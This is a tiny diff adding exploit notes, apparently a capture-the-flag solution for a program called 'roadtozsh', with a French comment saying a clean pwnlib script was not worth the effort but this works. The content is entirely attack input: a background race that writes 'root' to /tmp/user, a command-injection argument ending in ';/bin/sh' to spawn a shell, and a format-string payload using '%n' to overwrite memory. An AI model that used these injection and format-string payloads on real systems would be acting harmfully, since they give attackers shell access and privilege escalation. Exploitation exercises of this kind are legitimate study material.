@@ -1,0 +1,6 @@
+# la flemme de faire un pwnlib clean, mais ça fonctionne
+
+$(sleep 1 && echo -n "root" > /tmp/user) & ./roadtozsh test\;/bin/sh
+
+input: %.65536d%35$n
+
